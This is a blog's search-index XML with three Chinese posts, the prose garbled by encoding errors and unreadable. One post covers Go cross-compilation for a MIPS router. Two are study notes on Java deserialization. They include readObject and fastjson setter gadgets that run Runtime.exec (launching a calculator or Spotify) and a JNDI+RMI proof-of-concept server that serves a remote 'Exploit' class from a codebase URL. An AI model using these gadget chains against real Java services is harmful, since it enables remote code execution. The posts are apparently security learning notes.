<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Golangäº¤å‰ç¼–è¯‘</title>
    <url>/2022/12/30/Golang%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<p>é˜³ğŸ‘äº†,ç„¶åè¶è¿™æ®µæ—¶é—´,ç¨å¾®æ•´ç†ä¸€ä¸‹è¿™æ®µæ—¶é—´è®°ä¸‹æ¥çš„ç¬”è®°.</p>
<p>ç”¨åˆ°golangçš„äº¤å‰ç¼–è¯‘æ˜¯å› ä¸ºæƒ³åœ¨è·¯ç”±å™¨ä¸Šä½¿ç”¨cloudreve,ä½†æ˜¯è·¯ç”±å™¨çš„CPUæŒ‡ä»¤é›†æ˜¯mipsçš„,å¼€å‘è€…é‚£æ²¡æœ‰é¢„ç¼–è¯‘è¿™ä¸ªç‰ˆæœ¬,ç„¶ååœ¨æˆ‘é‚£ä¸ªæ€§èƒ½å­±å¼±çš„è·¯ç”±å™¨ä¸Šè·‘dockerå°±ç®—äº†,æ‰€ä»¥å°±æ‰“ç®—è‡ªå·±ç¼–è¯‘ä¸‹.</p>
<p>ç›®æ ‡: Darwinå¹³å° äº¤å‰ç¼–è¯‘golangç¨‹åºåˆ° mipså¹³å°ä¸‹å¯æ‰§è¡Œç¨‹åº.</p>
<span id="more"></span>



<h2 id="1-å®‰è£…äº¤å‰ç¼–è¯‘å·¥å…·é“¾"><a href="#1-å®‰è£…äº¤å‰ç¼–è¯‘å·¥å…·é“¾" class="headerlink" title="1.å®‰è£…äº¤å‰ç¼–è¯‘å·¥å…·é“¾"></a>1.å®‰è£…äº¤å‰ç¼–è¯‘å·¥å…·é“¾</h2><p>é¦–å…ˆæ˜¯å‚è€ƒäº†è¿™ä¸ªè€å“¥çš„è¯‘æ–‡</p>
<p><a href="https://saekiraku.github.io/article/18577/">https://saekiraku.github.io/article/18577/</a></p>
<p>è£…ä¸Šäº†MacOSä¸‹ç”¨äºäº¤å‰ç¼–è¯‘çš„cåº“,æˆ‘ç›´æ¥è£…å…¨äº†,çœçš„ä»¥åè¿˜æœ‰ä»€ä¹ˆå¥‡æ€ªå¹³å°çš„éœ€æ±‚,ä¹Ÿå¯ä»¥åªwithä¸€éƒ¨åˆ†.</p>
<p><code>brew install FiloSottile/musl-cross/musl-cross --with-x86_64 --with-aarch64 --with-arm-hf --with-i486 --with-arm --with-mips --with-mipsel --with-mips64 --with-mips64el</code></p>
<h2 id="2-å¼€å§‹go-build"><a href="#2-å¼€å§‹go-build" class="headerlink" title="2.å¼€å§‹go build"></a>2.å¼€å§‹go build</h2><p><strong>ä¸»è¦æ˜¯è¸©äº†ä¸€ä¸ªå‘,å› ä¸ºè¢«ç¼–è¯‘çš„ç¨‹åºéœ€è¦sqliteç¯å¢ƒ,sqliteæ˜¯éœ€è¦ç›®æ ‡ç³»ç»Ÿæœ¬åœ°Cç±»åº“æ”¯æŒçš„,æ‰€ä»¥å¿…é¡»è¦å¼€å¯CGO,ä¹Ÿå°±æ˜¯CGO_ENABLED=1</strong></p>
<ul>
<li><p>GOOSæ˜¯ç›®æ ‡å¹³å°</p>
</li>
<li><p>GOARCHæ˜¯ç›®æ ‡cpuæŒ‡ä»¤é›†</p>
</li>
<li><p>GOMIPSæ˜¯mipsçš„ç‰¹æœ‰è½¯æµ®ç‚¹</p>
</li>
<li><p>CCå°±æ˜¯æŒ‡ä»¤é›†äº†è¿™é‡Œåº”è¯¥æ”¾ç»å¯¹è·¯å¾„çš„ç›®æ ‡å¹³å°äº¤å‰ç¼–è¯‘æŒ‡ä»¤é›†</p>
</li>
</ul>
<p>å°†ä¸Šé¢å‡ ç‚¹æ”¾åœ¨ä¸€æ¡å‘½ä»¤ä¸­,ç„¶åbuild</p>
<p><code>GOOS=linux GOARCH=mipsle GOMIPS=softfloat CGO_ENABLED=1 CC=mipsel-linux-muslsf CGO_LDFLAGS=&quot;-static&quot; go build -a -ldflags=&quot;-s -w&quot; -o cloudreve</code></p>
<p>æœ€åç¼–è¯‘å®Œæˆçš„äºŒè¿›åˆ¶å°±å¯ä»¥ç›´æ¥åœ¨ç›®æ ‡å¹³å°ä¸Šè¿è¡Œäº†.</p>
<p>ç„¶åæœ€åé¡ºä¾¿ç»™æˆ‘çš„cloudreveåŠ äº†ä¸€ä¸ªhttps,<code>acme.sh</code>è¿™ä¸ªé¡¹ç›®éå¸¸çš„å¥½ç”¨.</p>
]]></content>
      <categories>
        <category>ç¼–ç¨‹è¯­è¨€</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–(1)</title>
    <url>/2021/11/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1/</url>
    <content><![CDATA[<h2 id="javaååºåˆ—åŒ–"><a href="#javaååºåˆ—åŒ–" class="headerlink" title="javaååºåˆ—åŒ–"></a>javaååºåˆ—åŒ–</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: harry</span></span><br><span class="line"><span class="comment"> * @Date: 2021-11-04 19:09:14</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2021-11-04 19:22:01</span></span><br><span class="line"><span class="comment"> * @LastEditors: harry</span></span><br><span class="line"><span class="comment"> * @Description: edited by harry</span></span><br><span class="line"><span class="comment"> * @FilePath: /java_tmp/un_serializaable.java</span></span><br><span class="line"><span class="comment"> * @E-mail: lycshub@gmail.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰ä¸€ä¸ªå¯åºåˆ—åŒ–çš„ç±»ï¼Œè¯¥ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CanSerializable</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String first_name;</span><br><span class="line">    <span class="keyword">public</span> String last_name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayhello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.first_name + <span class="string">&quot; &quot;</span> + <span class="keyword">this</span>.last_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‡ªå®šä¹‰ readObject æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³•</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰§è¡Œå‘½ä»¤,windowså¼¹è®¡ç®—æœºæˆ‘å°±å¼¹ä¸ªspotifyå§</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;spotify&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åºåˆ—åŒ–/ååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">un_serializaable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªå¯åºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">        CanSerializable testClass = <span class="keyword">new</span> CanSerializable();</span><br><span class="line">        testClass.first_name = <span class="string">&quot;harry&quot;</span>;</span><br><span class="line">        testClass.last_name = <span class="string">&quot;smith&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        <span class="comment">// å°†åºåˆ—åŒ–åçš„å¯¹è±¡å†™å…¥åˆ°æ–‡ä»¶</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        os.writeObject(testClass);</span><br><span class="line">        os.close();</span><br><span class="line">        fos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–</span></span><br><span class="line">        CanSerializable obj = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶è¯»å–åºåˆ—åŒ–çš„ç»“æœåè¿›è¡Œååºåˆ—åŒ–</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        obj = (CanSerializable) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(obj.first_name);</span><br><span class="line">        System.out.println(obj.last_name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–å¿…é¡»æœ‰ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<ol>
<li>è¯¥ç±»å¿…é¡»å®ç° java.io.Serializable æ¥å£</li>
<li>è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„</li>
</ol>
<p>windowså¼¹ä¸ªè®¡ç®—å™¨ï¼Œæˆ‘å°±å¼¹ä¸ªspotifyå§</p>
<span id="more"></span>

<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/2021-11-04_21-10-2021-11-421:11:28.png"></p>
<h2 id="Java-RMIè°ƒç”¨åŠå…¶æ¼æ´"><a href="#Java-RMIè°ƒç”¨åŠå…¶æ¼æ´" class="headerlink" title="Java RMIè°ƒç”¨åŠå…¶æ¼æ´"></a>Java RMIè°ƒç”¨åŠå…¶æ¼æ´</h2><p>RMIå°±æ˜¯è¿œç¨‹è°ƒç”¨ï¼ŒRMIï¼ˆRemote Method Invocationï¼‰ï¼šä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå¸¸è§çš„ä¸¤ç§æ¥å£å®ç°ä¸º JRMPï¼ˆJava Remote Message Protocol ï¼ŒJava è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰ä»¥åŠ CORBAã€‚</p>
<p>å®ç°çš„å…·ä½“æ–¹å¼å°±æ˜¯é€šè¿‡æœåŠ¡ç«¯æ³¨å†ŒServerç„¶åç”±å®¢æˆ·ç«¯è°ƒç”¨,demoå®ç°å¦‚ä¸‹</p>
<p>ç›®å½•ç»“æ„</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636030069762-2021-11-420:47:49.png"></p>
<p>RMIServer.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> service.impl.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="comment">//RMIæœåŠ¡ç«¯ï¼Œç”¨äºæŠŠæœ¬æœºä¿¡æ¯ç»‘å®šåˆ°æœåŠ¡ç«¯å¹¶ä¸”æ³¨å†ŒæœåŠ¡</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        Hello hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ç”Ÿæˆå­˜æ ¹ï¼ˆStubï¼‰</span></span><br><span class="line">        UnicastRemoteObject.exportObject(hello, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæœ¬æœº 1099 ç«¯å£ä¸Šçš„ RMI registry</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¯¹è±¡ç»‘å®šåˆ°æ³¨å†Œè¡¨ä¸­</span></span><br><span class="line">        registry.rebind(name, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>RMIClient.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®¢æˆ·ç«¯ï¼Œæ¥æ”¶ç”¨æˆ·è¾“å…¥</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–è¿œç¨‹ä¸»æœºä¸Šçš„æ³¨å†Œè¡¨</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–è¿œç¨‹å¯¹è±¡</span></span><br><span class="line">        Hello hello = (Hello) registry.lookup(name);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Scanner sc = <span class="keyword">new</span> Scanner(System.in); <span class="comment">// è¯»å–è¾“å…¥</span></span><br><span class="line">            String message = sc.next();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è°ƒç”¨è¿œç¨‹æ–¹æ³•</span></span><br><span class="line">            hello.echo(message);</span><br><span class="line">            <span class="keyword">if</span> (message.equals(<span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// sc.close();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Hello.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>helloImpl.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> service.impl;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="comment">//å®ç°helloç±»çš„æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">	<span class="comment">//å¦‚æœç”¨æˆ·è¾“å…¥quitå°±å…³é—­æœåŠ¡å™¨RMIServer</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;quit&quot;</span>.equalsIgnoreCase(message.toString()))&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;Server will be shutdown!&quot;</span>);</span><br><span class="line">		System.exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//équitçš„å­—ç¬¦ç›´æ¥æ‰“å°åœ¨ç»ˆç«¯</span></span><br><span class="line">	System.out.println(<span class="string">&quot;Message from client: &quot;</span> + message);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;Server response:&quot;</span> + message;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å¾€<code>RMIClient</code>å‘½ä»¤è¡Œè¾“å…¥å­—ç¬¦</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636029696988-2021-11-420:41:37.png"></p>
<p>RMIServeræ”¶åˆ°æ¶ˆæ¯</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/image-20211104204551849-2021-11-420:46:24.png"></p>
<p>demoç»“æŸ</p>
<h3 id="å’Œååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ"><a href="#å’Œååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ" class="headerlink" title="å’Œååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ"></a>å’Œååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ</h3><p>å› ä¸ºRMI åœ¨ä¼ è¾“æ•°æ®çš„æ—¶å€™ï¼Œä¼šå°†æ•°æ®åºåˆ—åŒ–ï¼Œåœ¨ä¼ è¾“å®Œæˆåå†è¿›è¡Œååºåˆ—åŒ–ã€‚å®¢æˆ·ç«¯æä¾›æ„é€ å¥½çš„æ¶æ„æ•°æ®ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶åè¿›è¡Œååºåˆ—åŒ–è§¦å‘ä»£ç æ‰§è¡Œã€‚</p>
<ul>
<li>èƒ½å¤Ÿè¿›è¡Œ RMI é€šä¿¡</li>
<li>æœåŠ¡å™¨å¼•ç”¨ç¬¬ä¸‰æ–¹å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„åŒ…</li>
</ul>
<p>æŒ–ä¸ªå‘ï¼Œä¹‹åç ”ç©¶ä¸‹RMIçš„ååºåˆ—åŒ–</p>
<p>å‚è€ƒå¸ˆå‚…çš„æ–‡ç« <a href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">Jcklingâ€™s Blog</a></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–-2(fastjson)</title>
    <url>/2021/11/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2-fastjson/</url>
    <content><![CDATA[<h2 id="fastjsonåŸºæœ¬ä½¿ç”¨"><a href="#fastjsonåŸºæœ¬ä½¿ç”¨" class="headerlink" title="fastjsonåŸºæœ¬ä½¿ç”¨"></a>fastjsonåŸºæœ¬ä½¿ç”¨</h2><p>é¦–å…ˆå°±æ˜¯æ–°å»ºä¸€ä¸ªmavené¡¹ç›®ï¼Œå› ä¸ºç°åœ¨æ‰‹å¤´è¿™å°æœºå­æ²¡è£…idea,å°±ç”¨vscodeå§</p>
<p>åŒ…åä¸º<code>com.fastjsonser</code></p>
<span id="more"></span>

<p>ç›®å½•ç»“æ„å¦‚ä¸‹:</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636339894358-2021-11-810:51:34.png"></p>
<p>Person.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsonser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>Ser.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjsonser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Ser</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">&quot;harry&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">22</span>);</span><br><span class="line">        <span class="comment">// è°ƒç”¨äº†è¿™ä¸ªSerializerFeature.WriteClassNameå°±ä¼šåœ¨jsonæ•°æ®ä¸­ç”Ÿæˆä¸€ä¸ª@typeï¼Œ</span></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–æ—¶å°±åªéœ€è¦parseObjectå°±å¯ä»¥ç›´æ¥ååºåˆ—åŒ–è€Œä¸éœ€è¦åŠ ä¸Šç±»å‹çš„æŒ‡ç¤º</span></span><br><span class="line">        String jsonstring = JSON.toJSONString(person, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">        <span class="comment">// unserialise</span></span><br><span class="line">        System.out.println(JSON.parse(jsonstring));</span><br><span class="line">        System.out.println(JSON.parseObject(jsonstring));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636340011716-2021-11-810:53:31.png"></p>
<p>å¯ä»¥çœ‹åˆ°å› ä¸ºparseæ²¡æ‰§è¡ŒæˆåŠŸï¼ŒparseObjectæ‰§è¡ŒæˆåŠŸäº†ï¼Œå› ä¸ºparseObjectä¼šæ ¹æ®@typeæ¥è‡ªåŠ¨è½¬æ¢å¯¹è±¡æˆjson</p>
<p>å°è¯•åœ¨å„ä¸ªget.setä¸­åŠ å…¥è¾“å‡ºè¯­å¥æ¥æ–¹ä¾¿è§‚å¯Ÿè°ƒç”¨çš„é¡ºåºå’Œé€»è¾‘ï¼š</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636340731118-2021-11-811:05:31.png"></p>
<p>æ¼æ´åœ¨äºparseåªä¼šè§¦å‘setæ–¹æ³•ï¼ŒparseObjectä¼šè§¦å‘get,setä¸¤ç§æ–¹æ³•ï¼Œè¿™ç§ç‰¹æ€§å¯¼è‡´äº†ååºåˆ—åŒ–æ¼æ´çš„å‘ç”Ÿï¼Œåœ¨getä¸­æ„é€ æ¶æ„çš„ä»£ç ä¼šè¢«è‡ªåŠ¨çš„æ‰§è¡Œ</p>
<h2 id="è§¦å‘ååºåˆ—åŒ–"><a href="#è§¦å‘ååºåˆ—åŒ–" class="headerlink" title="è§¦å‘ååºåˆ—åŒ–"></a>è§¦å‘ååºåˆ—åŒ–</h2><p>ä¿®æ”¹personç±»ï¼Œå¾€é‡Œé¢åŠ å…¥ä¸€ä¸ªæ–°çš„æˆå‘˜å˜é‡,<code>private String gender</code>å¹¶è¡¥å…¨set,getæ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getGender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;call getgender&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGender</span><span class="params">(String gender)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;call setgender&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.gender = gender;</span><br><span class="line">    <span class="comment">// æ„é€ æ¶æ„è¯­å¥ï¼Œç†Ÿæ‚‰çš„Runtimeç±»ï¼Œè¿™æ¬¡ä¸å¼¹spotifyäº†...</span></span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;gnome-calculator&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1636341289534-2021-11-811:14:49.png"></p>
<p>å¼¹äº†ä¿©è®¡ç®—å™¨å¹¶ä¸”set,getåˆ†åˆ«æ‰§è¡Œäº†ä¸¤æ¬¡ï¼Œå¾ˆå¥½ç†è§£å› ä¸ºç»™</p>
<p>personèµ‹å€¼çš„æ—¶å€™è°ƒç”¨äº†ä¸€æ¬¡set,</p>
<p>toJSONStringçš„æ—¶å€™è°ƒç”¨äº†ä¸€æ¬¡get</p>
<p>parseobjectä¼šåˆ†åˆ«è°ƒç”¨ä¸€æ¬¡set,get</p>
<h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><p>è®°å½•ä¸€ä¸‹poc</p>
<h3 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI+RMI"></a>JNDI+RMI</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JNDIServer.java</span></span><br><span class="line"><span class="keyword">package</span> com.fastjsonser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;com.fastjsonser.badClassName&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

